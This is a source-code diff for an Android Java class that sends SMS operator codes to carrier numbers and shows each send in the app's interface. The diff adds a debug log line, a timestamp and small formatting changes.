@@ -73,11 +73,12 @@ public class GetMsgRunnable implements Runnable {
 			}
 			for (int i = 0; i < list.size(); i++) {
 				CheckInfo info = list.get(i);
-				final boolean isDeleteOldData = info.getDeleteOldData();
+				final boolean isDeleteOldData = Boolean.valueOf(info.getDeleteOldData());
 				final String operators = info.getOperators();
 				final String operatorCode = info.getOperatorCode();
 
 				final String operatorInfo = operators + "_" + operatorCode;
+                Log.d(TAG,"短信:"+operatorInfo);
 				boolean isExist = Util_Sp.isOperatorInfoExist(mContext, operatorInfo);
 				if (isExist) {
 					if (!isDeleteOldData) {
@@ -86,9 +87,10 @@ public class GetMsgRunnable implements Runnable {
 				}
 				//发送短信
 				if (DEBUG) Log.d(TAG, "开始发送短信！！！！！！！！");
+                sendSmsTime = System.currentTimeMillis();
 				SmsManageUtil.getInstance(mContext).sendSMS(operators, operatorCode);
 				currentCheckInfo = info;
-				String message = "send " + info.getOperatorCode() + " to " + info.getOperators();
+				String message = "\n\nsend " + info.getOperatorCode() + " to " + info.getOperators();
 				MessageEvent messageEvent = new MessageEvent(message);
 				EventBus.getDefault().post(messageEvent);
 				try {
@@ -101,8 +103,6 @@ public class GetMsgRunnable implements Runnable {
 						Log.e(TAG, e.toString());
 					}
 				}
-
-
 			}
 		}
 	}
